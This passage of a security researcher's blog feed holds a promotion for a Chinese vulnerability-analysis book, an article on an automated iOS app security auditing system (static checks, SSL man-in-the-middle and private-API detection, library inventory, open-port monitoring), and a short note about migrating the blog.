&lt;h4 id=&quot;著书感言&quot;&gt;&lt;a href=&quot;#著书感言&quot; class=&quot;headerlink&quot; title=&quot;著书感言&quot;&gt;&lt;/a&gt;著书感言&lt;/h4&gt;&lt;p&gt;　　本书是我写的第一本书，也可能是最后一本技术书籍，只有自己经历了著书过程，才知道写书的不易。特别是类似本书这种以漏洞实例进行调试分析的书，写起来特别费时，也更需要有持之以恒之的毅力。如果说单纯写书用掉1年时间，那么我用来调试的时间大约是3年，因此可以说这是”一本用调试器写出来的书”。&lt;br&gt;　　“开头容易，收尾难”是个人著书的真实感受，很多人一时兴起写了开头，最后很难坚持下去，导致夭折了不少著作。
　　&lt;/p&gt;
&lt;h4 id=&quot;本书结构&quot;&gt;&lt;a href=&quot;#本书结构&quot; class=&quot;headerlink&quot; title=&quot;本书结构&quot;&gt;&lt;/a&gt;本书结构&lt;/h4&gt;&lt;p&gt;　　本书共12章，可以分为三大部分。&lt;br&gt;　　基础篇（第1章）：主要介绍一些软件漏洞相关的基本概念，以及常用工具及漏洞分析方法，最后向读者推荐一些相关的学习站点和书籍，方便读者做进一步地学习和交流。&lt;br&gt;　　实战篇（第2~11章）：是本书最主要的部分，根据不同的漏洞类型挑选不同的经典案例，用不同的漏洞分析技巧，向读者介绍比较高效的分析方法，剖析各种常见的软件漏洞类型、原理、利用和修复的实战技术。同时，紧跟当前热门的移动互联网安全问题，增加了Android平台的漏洞分析，以保持内容与时俱进。&lt;br&gt;　　展望篇（第12章）：对未来的软件漏洞发展趋势做出预判，相信未来的主要战场会更集中在移动终端、云计算平台、物联网三大方向上，并对现有的这些方向的漏洞案例进行简要介绍。&lt;/p&gt;
&lt;h4 id=&quot;致谢&quot;&gt;&lt;a href=&quot;#致谢&quot; class=&quot;headerlink&quot; title=&quot;致谢&quot;&gt;&lt;/a&gt;致谢&lt;/h4&gt;&lt;p&gt;　　感谢我父母的养育之恩，是他们在背后默默地支持我前行。&lt;br&gt;　　感谢我的兄长在生活和工作上对我的帮助与支持。&lt;br&gt;　　感谢我的女朋友，正是她的督促和支持才让我能够准时完稿，并且书中有些截图是经过她后期制作的，以便使得图片的印刷效果更好。&lt;br&gt;　　感谢我的姑母长期以来对我生活上的关心与照顾。&lt;br&gt;　　感谢我的公司腾讯，它所营造的良好氛围，使我的技术水平和在职场的发展都更上一层楼。同时也感谢在工作中一直给予我帮助和鼓励的同事和领导，由于人数较多，就不一一列举。&lt;br&gt;　　感谢王清先生为本书作序，他所著书籍一直是软件安全行业的经典。&lt;br&gt;　　感谢博文视点的编辑皎子、郑柳洁及她们的团队，正是他们的努力才使得本书最终能够与大家见面。&lt;br&gt;　　感谢各位圈内的朋友，他们包括但不限于（排名不分先后）：wushi、爱无言、仙果、wingdbg、instruder、kanxue、lake2、harite、h4ckmp、dragonltx、非虫、monster、gmxp、古河、冰雪风谷、KiDebug、KK……&lt;br&gt;　　由于作者水平有限，书中难免有误，欢迎各位业界同仁斧正！&lt;/p&gt;
&lt;h3 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言　　&quot;&gt;&lt;/a&gt;序言　　&lt;/h3&gt;&lt;p&gt;独乐乐，与人乐乐，孰乐？&lt;/p&gt;
&lt;p&gt;不断向底层钻研的技术深度，创造性的广度思维，契而不舍地执着追求是成为优秀的安全研究员所必备的基础素质，无疑riusksk全都具备。&lt;/p&gt;
&lt;p&gt;单论技术本身，问世间，是否此山最高，没有人能说的清楚。但是我在书目中还看到了许多超出技术的其他元素:有精益求精、追求完美的极客精神；有循序渐进、耐心引导的导师身影；有架构明晰，逻辑严谨的整体设计感；最能打动我的，其实是那份炽热的分享精神，毫无保留地去帮助那些还在摸索中学习的朋友。&lt;/p&gt;
&lt;p&gt;一代宗师除了不断修炼自己之外，还需要将自己的智慧发扬传承，我在书中看到了这样的影子。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;《0day安全：软件漏洞分析技术》作者，北京子衿晨风科技有限公司CEO  failwest &lt;/h4&gt;


&lt;h3 id=&quot;媒体评论&quot;&gt;&lt;a href=&quot;#媒体评论&quot; class=&quot;headerlink&quot; title=&quot;媒体评论　　&quot;&gt;&lt;/a&gt;媒体评论　　&lt;/h3&gt;&lt;p&gt;本书对近年来影响比较大的漏洞一一详细剖析，于细节处可以看出作者的功力，对于漏洞攻防领域是一本不可多得的原创好书。&lt;br&gt;　　读者可以对照着动手调试这些经典漏洞，我相信只要认真做一遍，功力会大增。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;– 腾讯科恩实验室总监 wushi&lt;/h4&gt;

&lt;p&gt;　　过去的几年，我们见证了移动互联网的兴起，也见证了软件漏洞战场从PC端向移动端的迁移。本书从这个视角出发，结合实例、深入浅出、涵盖全面，是学习软件漏洞的绝佳之选。同时本书作者riusksk（泉哥）在腾讯安全应急响应中心负责软件漏洞的处理和研究，有着丰富的实战经验。强烈推荐！&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 腾讯安全平台部总监 lake2&lt;/h4&gt;

&lt;p&gt;安全漏洞的挖掘与分析是隐秘且难度较高的一门技术，系统性的学习资料更是少之又少。本书以近年来报告出的经典漏洞为蓝本，分析并讲解了常见的各种系统及软件漏洞的成因及攻击方法，通过对这些精彩漏洞实例的全面讲解，相信读者对软件漏洞技术会有更加全面的认识。并且随着全书内容的展开，读者一定会与我一样，被漏洞挖掘者的聪明与智慧深深所折服。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 软件安全专家，《Android软件安全与逆向分析》及《Mac OS X软件安全与逆向分析》作者 丰生强&lt;/h4&gt;

&lt;p&gt;对软件漏洞进行分析研究是提高软件安全技术水平的途径之一，他山之石可以攻玉，这本书为我们提供了一个很好的开始，值得认真学习。移动平台的漏洞研究是当下的热点，这本书与时俱进地纳入了这一部分内容，不可不读也！&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 自由安全研究者，《挖0day》作者 爱无言&lt;/h4&gt;

&lt;p&gt;这是自《0day安全：软件漏洞分析技术》以来，又一本关于二进制漏洞分析最全面的力作书籍，该书籍结合新的经典漏洞与新型分析方法，深度剖析不同类型的安全漏洞，结合不同的分析方法，做到授人以渔。相信能够帮助那些希望从事安全行业的人员，为其提供更好的帮助。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 阿里安全威胁情报中心  安全专家 instruder&lt;/h4&gt;

&lt;p&gt;随着互联网的蓬勃发展，安全漏洞也跟着逐年爆发。未知攻，焉知防！因此，如何快速分析漏洞成因是安全研究员必备的一项技能。本书涵盖了各种各样的漏洞类型，覆盖了PC端和移动端，极具实战性和全面性，兼具实用性和时效性，干货满满，是安全研究员提高漏洞分析能力的利器。俱往矣，数漏洞分析，还看此书！&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 阿里巴巴移动安全 dragonltx&lt;/h4&gt;




</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/media/book.png&quot; alt=&quot;&quot;&gt;&lt;/center&gt;

&lt;h3 id=&quot;预售地址&quot;&gt;&lt;a href=&quot;#预售地址&quot; class=&quot;headerlink&quot; title=&quot;预售地址　&quot;&gt;&lt;/a&gt;预售地址　&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://product.china-pub.com/4971073#qy&quot;&gt;China-Pub&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://search.jd.com/Search?keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;wq=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;pvid=3wfwj4qi.gk4kteggu1ql3#keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;qrst=1&amp;amp;rt=1&amp;amp;stop=1&amp;amp;vt=2&amp;amp;psort=2&amp;amp;click=2&quot;&gt;京东&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://world.taobao.com/search/search.htm?sort=price&amp;amp;_ksTS=1467426638963_384&amp;amp;spm=a21bp.7806943.20151106.1&amp;amp;search_type=0&amp;amp;json=on&amp;amp;cna=L%20rnC6dL4EYCATr7VsQhHYop&amp;amp;module=sortList&amp;amp;_input_charset=utf-8&amp;amp;navigator=all&amp;amp;s=0&amp;amp;q=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81&amp;amp;callback=__jsonp_cb&amp;amp;abtest=_AB-LR517-LR854-LR895-PR517-PR854-PV895_2462&quot;&gt;淘宝&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;编辑推荐&quot;&gt;&lt;a href=&quot;#编辑推荐&quot; class=&quot;headerlink&quot; title=&quot;编辑推荐　&quot;&gt;&lt;/a&gt;编辑推荐　&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》是这些年来难得一见的系统、全面深入分析漏洞攻防心要与战术的书籍。《漏洞战争：软件漏洞分析精要》结合经典的漏洞案例，从攻防思路、分析方法与实战等方面对漏洞攻防做了详细的阐述。既照顾了全局的视野，又不失细节上的周到，对于有志于安全事业并想在安全技术分析上有所提升的读者，这是一本可信赖的必备书籍。正如wushi老师所说：”……对照本书动手调试这些经典漏洞，我相信只要认真做一遍，功力会大增。”&lt;br&gt;还犹豫什么呢，好书，一本就够！&lt;/p&gt;
&lt;h3 id=&quot;内容简介&quot;&gt;&lt;a href=&quot;#内容简介&quot; class=&quot;headerlink&quot; title=&quot;内容简介&quot;&gt;&lt;/a&gt;内容简介&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》系统地讲解软件漏洞分析与利用所需的各类工具、理论技术和实战方法，主要涉及Windows 和Android 系统平台。《漏洞战争：软件漏洞分析精要》根据不同的软件漏洞类型划分，比如堆栈溢出、沙盒逃逸、类型混淆、UAF、内核漏洞等，同时又针对当前流行的移动安全，加入Android 平台上的漏洞分析与利用。以精心挑选的经典漏洞为例，以分享漏洞的分析技巧和工具为主，对这些漏洞的成因、利用及修复方法进行详细讲解，旨在”授之以渔”。《漏洞战争：软件漏洞分析精要》最大的特点是以各种类型的经典漏洞作为实战讲解，摒弃空头理论，几乎是”一本用调试器写出来的书”。&lt;br&gt;《漏洞战争：软件漏洞分析精要》适合计算机相关专业的本科及研究生，信息安全爱好者，软件安全及移动安全相关的安全从业人员，软件开发与测试人员、黑客等阅读。 &lt;/p&gt;
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>浅谈iOS应用安全自动化审计</title>
    <link href="http://riusksk.github.io/2016/06/23/ios-auditor/"/>
    <id>http://riusksk.github.io/2016/06/23/ios-auditor/</id>
    <published>2016-06-22T16:00:00.000Z</published>
    <updated>2016-06-26T09:35:57.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;此前有人统计过2015年漏洞最多的产品，苹果的OSX与iOS系统分别占据第一二名，虽有人怀疑统计数据可能存在重复的不准确情况，但相信大趋势是不会变的。&lt;/p&gt;
&lt;p&gt;2015年在iOS平台上也发生过不少安全大事，比如“XcodeGhost”事件、iOS9越狱、“iBackDoor“、“YouMi“事件等等，尤其是XcodeGhost影响甚大，注定要在iOS安全史上留下重重的一笔。&lt;/p&gt;
&lt;p&gt;结合CVEDetails站点上对iOS系统漏洞的统计情况【图1】，整体处于上升的趋势，尤其是2015年增长迅速，是2014年的3倍多，由此也可以预见iOS平台上的安全漏洞正在快速增长，iOS应用亦然。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图1：iOS系统历年漏洞数量统计图&lt;br&gt;&lt;/center&gt;

&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;腾讯也有很多iOS应用产品，基本上android上有的，对应的同款应用在iOS上也会有。目前Android应用的审计技术在业界都已经于相对成熟，而iOS应用漏洞审计系统在国内还是比较欠缺的，一些公司可能内部有开发，只是未公开。&lt;/p&gt;
&lt;p&gt;此前腾讯iOS产品也是未能做有效的上线前审计，遗留一些安全隐患，因此我们对此专门研发了一款针对iOS应用的自动化审计系统。除了日常的应用审计外，同时也是希望它能够在安全应急上起到辅助的作用。本文主要就是针对它使用到的一些技术进行浅谈，以希望可以起到抛砖引玉的效果。&lt;/p&gt;
&lt;h3 id=&quot;开发环境&quot;&gt;&lt;a href=&quot;#开发环境&quot; class=&quot;headerlink&quot; title=&quot;开发环境&quot;&gt;&lt;/a&gt;开发环境&lt;/h3&gt;&lt;p&gt;• Mac OS X 10.11&lt;br&gt;• Python 开发环境：PyCharm5&lt;br&gt;• Objective-C 开发环境：Xcode7 + iOSOpenDev&lt;br&gt;• 支持 iOS 8.1 以上的越狱系统&lt;/p&gt;
&lt;h3 id=&quot;系统架构&quot;&gt;&lt;a href=&quot;#系统架构&quot; class=&quot;headerlink&quot; title=&quot;系统架构&quot;&gt;&lt;/a&gt;系统架构&lt;/h3&gt;&lt;p&gt;整个iOS应用审计系统主要分两部分：静态审计和动态审计【图2】。静态审计包括Bin文件漏洞审计、第三方库检测以及私有API静态检测等功能；动态审计主要通过Hook去监控网络数据包、SSL中间人检测，以及实现ipa的动态安装和运行、文件上传下载等基本功能。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图2：iOS应用审计系统架构图&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;基本审计功能&quot;&gt;&lt;a href=&quot;#基本审计功能&quot; class=&quot;headerlink&quot; title=&quot;基本审计功能&quot;&gt;&lt;/a&gt;基本审计功能&lt;/h3&gt;&lt;p&gt;通过静态审计提取基本的文件信息，并以较好的展示效果输出到报告页面上【图3】，也方便后面的二次扫描，以及鉴别不同的ipa文件。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;    图3：文件信息及漏洞统计图&lt;br&gt;    &lt;/center&gt;

&lt;p&gt;在静态审计里最重要的就是Bin文件漏洞检测功能【图4】，像编译选项和使用函数的信息，借助otool即可很容易检测。&lt;/p&gt;
&lt;p&gt;应用漏洞检测主要针对目前已公开的漏洞/恶意后门进行检测，比如XcodeGhost、iBackDoor、AFNetworking等等，先通过分析样本来制定静态检测规则，多数通过关键字符串即可检测出，而对于AFNetworking SSL中间人漏洞，笔者是采用检测漏洞相关的ARM指令。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图4：BIN静态审计功能&lt;br&gt;&lt;/center&gt;

&lt;p&gt;下面是AFNetworking某个漏洞版本的ARM指令【图5】，不同版本会有一定差异，所以还是需要对比多个不同版本，提取通用的检测规则（单纯检测下图标红的ARM指令会误报）。除此之外，还要对比修复版本的代码，避免误报。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图5：AFNetworking SSL 中间人漏洞代码&lt;br&gt;&lt;/center&gt;

&lt;p&gt;由于iOS应用为了兼容性，都会包含32位与64位程序，很少会单纯只使用64位编译的应用，所以检测时可以暂不用考虑64位问题。&lt;/p&gt;
&lt;p&gt;除图4上的应用漏洞之外，还支持自定义审计功能【图6】，主要是为了在应急时，可以及时即时制定规则进行批量扫描【图7】，我们也专门针对公司业务情况添加了一些规则，此处就不赘述了。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/6.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图6：自定义审计规则示例（非实际运用规则）&lt;br&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图7：应用批量扫描&lt;br&gt;&lt;/center&gt;

&lt;p&gt;上面【图6】只是一份示例的规则，并非在系统上实际运用的，只是作为演示，它支持二进制、数据库及文件的扫描，里面可以使用linux命令去辅助检测，当然你也可以笑称它为“后门”。&lt;/p&gt;
&lt;p&gt;另外，数据存储安全和网络传输安全都在动态审计部分完成，审计规则在自定义规则里面定义的。其中网络实时检测功能主要是基于Hook实现的，针对发包函数进行监控，比如NSURLConnection:sendSynchronousRequest 或者UIApplication:openURL等等【图8】。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图8：通过Hook网络相关API实现监听&lt;br&gt;&lt;/center&gt;

&lt;p&gt;程序会实时监听HTTP、HTTPS甚至是自定义伪协议的请求，而且为方便后续测试会记录cookie值，然后完整地输出到报告上【图9】，后续也可以把它导入扫描器作WEB漏洞扫描。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图9：网络请求实时监控&lt;br&gt;&lt;/center&gt;

&lt;p&gt;由于著名第三方库AFNetwork经常被使用，因此笔者也增加了对它的网络监控。&lt;/p&gt;
&lt;h3 id=&quot;UI界面遍历&quot;&gt;&lt;a href=&quot;#UI界面遍历&quot; class=&quot;headerlink&quot; title=&quot;UI界面遍历&quot;&gt;&lt;/a&gt;UI界面遍历&lt;/h3&gt;&lt;p&gt;为了触发更多地程序逻辑，增加代码覆盖率，在动态检测时，就需要去遍历各个UI界面。对于这种情况，我们选用appcrawler工具进行UI遍历，它同时支持Android与iOS应用，而在其提供的config.json配置文件里面，可根据自身需要去灵活配置，比如遍历的深度，匹配文本框关键字进行输入（如登录帐号），这些规则需要自己多测试应用去完善它。【图10】是遍历微信UI的部分截图效果，由于只遍历了10分钟，所以截图相对较少一些，整体效果还是不错的。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图10：遍历微信UI的部分截图&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;SSL中间人检测&quot;&gt;&lt;a href=&quot;#SSL中间人检测&quot; class=&quot;headerlink&quot; title=&quot;SSL中间人检测&quot;&gt;&lt;/a&gt;SSL中间人检测&lt;/h3&gt;&lt;p&gt;在移动APP中，无论是Android还是iOS平台，SSL中间人攻击都是一种常见漏洞，经常是由于证书校验不严谨导致的。虽然是中间人攻击，但在一定场景下还可以造成很大的危害，尤其是金融场所里面的WiFi，常常是最好的攻击点。&lt;/p&gt;
&lt;p&gt;针对SSL中间人漏洞，如果采用静态代码检测，可能误报率会比较高，笔者在此处是通过Hook做静态检测，在运行时注入证书异常站点的请求，然后再去检测是否访问成功【图11】。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/11.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图11：SSL中间人动态检测原理&lt;br&gt;&lt;/center&gt;

&lt;p&gt;以QQ浏览器HD为例，注入异常站点后会弹出【图12】中的提示，说明不会自动连接此站点，因此不存在SSL中间人漏洞。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/12.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图12：检测效果&lt;br&gt;&lt;/center&gt;

&lt;p&gt;不过对于使用第三方SSL库的应用可能会漏报，另一种替代方案是使用证书替换的检测方式，不过这会导致访问异常，最终可能导致应用无法正常使用，后续的审计动作也将被中止。各有各的弊端，可以暂时两者分开地使用，如果各位同仁有更好的检测方法，也欢迎在下面回复讨论。&lt;/p&gt;
&lt;h3 id=&quot;私有API检测&quot;&gt;&lt;a href=&quot;#私有API检测&quot; class=&quot;headerlink&quot; title=&quot;私有API检测&quot;&gt;&lt;/a&gt;私有API检测&lt;/h3&gt;&lt;p&gt;虽说调用私有API不算漏洞，但因为苹果严格的审计机制，一经发现调用私有API会直接下架应用，对业务影响也是很大。&lt;/p&gt;
&lt;p&gt;另外从安全角度看，如果应用的漏洞修复版本需要发布，但多次因为调用私有API也被苹果官方拒绝上架，就会导致漏洞无法得到及时的修复。&lt;/p&gt;
&lt;p&gt;检测私有API的难点主要在于苹果未公开这份私有API列表，因此在检测时只能自己提取，但也导致会因此存在一定的漏报和误报的情况。&lt;/p&gt;
&lt;p&gt;网络上有个提取私有API的公式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;私有的api ＝ (class-dump Framework下的库生成的头文件中的api - (Framework下的头文件里的api = 有文档的api + 没有文档的api)) + PrivateFramework下的api&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实这是不完全正确的，如果你单纯按照这种方法提取，会出现很高的误报和漏报情况。因为私有类里面有公有API，公有类里面有私有API。但上面的公式是提取私有API的第一步，之后就需要再做很多提取规则逐步完善，比如一些纯小写字母的api，大多是一些c库函数，可以再过滤一大批。&lt;/p&gt;
&lt;p&gt;这种没有什么特别好的方法，只能多扫应用，根据结果多优化规则。&lt;/p&gt;
&lt;p&gt;Github上面也有用于检测私有API的开源项目，但基本上没有一个可以满足测试需求的，误报率和漏报率太高，而且支持iOS版本较低。iOS9 SDK以上版本，也不能直接使用classdump去提取头文件，因为应用的符号表已经被去掉这些信息，笔者是采用nm去解决的。&lt;/p&gt;
&lt;p&gt;最初笔者是打算把动态检测私有API也做了，但后面考虑审计系统主要是面向公司内部，因此不存在那种恶意绕过私有API检测的行为，然后就把写了一半的动态检测功能给注释掉。&lt;/p&gt;
&lt;p&gt;如果读者要做动态检测私有API，那么误报和性能就是首要考虑的问题。hook太深，则消息过多，时耗过多，而且有些是系统自身调用的私有API，就无法正确区分是应用还是系统调用的；hook太浅，又达不到效果，没法监测到私有API的行为。这里抛张动态检测的半成品截图【图13】，大家可以继续发挥。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/13.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图13：动态检测私有API时的Hook日志（半成品）&lt;br&gt;&lt;/center&gt;

&lt;p&gt;为了提高静态检测的准确率，笔者就把静态拼接API字符串的情况也支持【图14】，因为正常情况下，两个字符串都是相邻的，组合起来再与私有API库作比较即可。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/14.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图14：字符串拼接绕过私有API检测&lt;br&gt;&lt;/center&gt;

&lt;p&gt;好了，说了这么多，直接上一张实战图。下面【图15】是针对去年曝光的一款iOS病毒TinyV做的检测（感谢ClaudXiao分享的样本），可以看到它调用LSApplicationWorkspace和MobileInstallation中的私有API去查看安装程序列表，安装和卸载应用。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/15.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图15：iOS病毒TinyV的私有API检测结果&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;第三方库检测&quot;&gt;&lt;a href=&quot;#第三方库检测&quot; class=&quot;headerlink&quot; title=&quot;第三方库检测&quot;&gt;&lt;/a&gt;第三方库检测&lt;/h3&gt;&lt;p&gt;有时外界会曝光一些第三方开源库的漏洞，影响经常是跨平台的，包括iOS应用。因此我们专门收集上百个常用第三方库信息作为检测内容，在日常审计应用时，能够维护一份哪些公司产品使用到哪些第三方库的信息【图16】，在外部曝光漏洞后，我们可以快速定位受影响的产品及危害范围。&lt;/p&gt;
&lt;p&gt;不过目前缺乏相应的版本信息，因为有些库编译出来后是不带版本字符串，需要针对不同版本作指纹库检测，也是个不少工程量，如果业界有好心人愿意造服群众的话，可以试试做个第三方库的指纹库出来。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/16.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图16：第三方库检测&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;开放端口检测&quot;&gt;&lt;a href=&quot;#开放端口检测&quot; class=&quot;headerlink&quot; title=&quot;开放端口检测&quot;&gt;&lt;/a&gt;开放端口检测&lt;/h3&gt;&lt;p&gt;之所以做开放端口检测这个功能，主要是基于此前曝光的“WormHole”漏洞，此类因开放端口导致的安全漏洞，在Android应用上已经有过不少案例，搜索乌云就能找到。&lt;/p&gt;
&lt;p&gt;检测开放端口其实一条命令就足够了，然后定期轮循即可：&lt;br&gt;lsof -i | grep ‘“+appname+”‘ | awk ‘{print $1,$8,$9,$10}’&lt;/p&gt;
&lt;p&gt;直接上效果图，如【图17】所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/17.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图17：开放端口审计&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;审计效果&quot;&gt;&lt;a href=&quot;#审计效果&quot; class=&quot;headerlink&quot; title=&quot;审计效果&quot;&gt;&lt;/a&gt;审计效果&lt;/h3&gt;&lt;p&gt;我们随机抽取了公司60款iOS应用，审计后共发现10款产品存在中高危漏洞【图18】，其中主要是SSL中间人漏洞和授权密钥泄露漏洞居多。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/18.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图18：审计结果&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;后记&quot;&gt;&lt;a href=&quot;#后记&quot; class=&quot;headerlink&quot; title=&quot;后记&quot;&gt;&lt;/a&gt;后记&lt;/h3&gt;&lt;p&gt;本文主要针对笔者在开发iOS应用自动审计系统时运用的一些技术作个分享，希望能起到抛砖引玉的作用。系统本身也还有一些有待完善的地方，欢迎各位业界同仁共同交流探讨。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;此前有人统计过2015年漏洞最多的产品，苹果的OSX与iOS系统分别占据第一二名，虽有人怀疑统计数据可能存在重复的不准确情况，但相信大趋势是不会变的。&lt;/p&gt;
&lt;p&gt;2015年在iOS平台上也发生过不少安全大事，比如“XcodeGhost”事件、iOS9越狱、“iBackDoor“、“YouMi“事件等等，尤其是XcodeGhost影响甚大，注定要在iOS安全史上留下重重的一笔。&lt;/p&gt;
&lt;p&gt;结合CVEDetails站点上对iOS系统漏洞的统计情况【图1】，整体处于上升的趋势，尤其是2015年增长迅速，是2014年的3倍多，由此也可以预见iOS平台上的安全漏洞正在快速增长，iOS应用亦然。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图1：iOS系统历年漏洞数量统计图&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="安全审计" scheme="http://riusksk.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="iOS" scheme="http://riusksk.github.io/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>迁移技术文章</title>
    <link href="http://riusksk.github.io/2016/06/17/add-articles/"/>
    <id>http://riusksk.github.io/2016/06/17/add-articles/</id>
    <published>2016-06-17T08:11:06.000Z</published>
    <updated>2016-06-17T08:24:10.000Z</updated>
    
    <content type="html">&lt;p&gt;由于博客大巴体验太差，因此开始启用github去写博客，用markdown+hexo写静态博客的感觉也挺好的，而且更安全。&lt;br&gt;后面我会把以前写的技术文章迁移到本博客，顺便把买来很久一直未用的riusksk.me域名给派上用场了，之前是因为备案流程过于繁琐，才导致一直未使用，使用 &lt;a href=&quot;http://riusksk.me&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://riusksk.me&lt;/a&gt; 解析到 &lt;a href=&quot;http://riusksk.github.io&quot;&gt;http://riusksk.github.io&lt;/a&gt; ，似乎就不用备案了。&lt;br&gt;近日，我已在本博客上添加RSS订阅和评论功能，欢迎大家订阅和交流。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;由于博客大巴体验太差，因此开始启用github去写博客，用markdown+hexo写静态博客的感觉也挺好的，而且更安全。&lt;br&gt;后面我会把以前写的技术文章迁移到本博客，顺便把买来很久一直未用的riusksk.me域名给派上用场了，之前是因为备案流程过于繁琐，才导致一直未使
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>PHDays安全大会议题分析</title>
    <link href="http://riusksk.github.io/2016/05/25/PHDays-2016/"/>
    <id>http://riusksk.github.io/2016/05/25/PHDays-2016/</id>
    <published>2016-05-25T02:09:17.000Z</published>
    <updated>2016-06-24T14:47:33.000Z</updated>
    
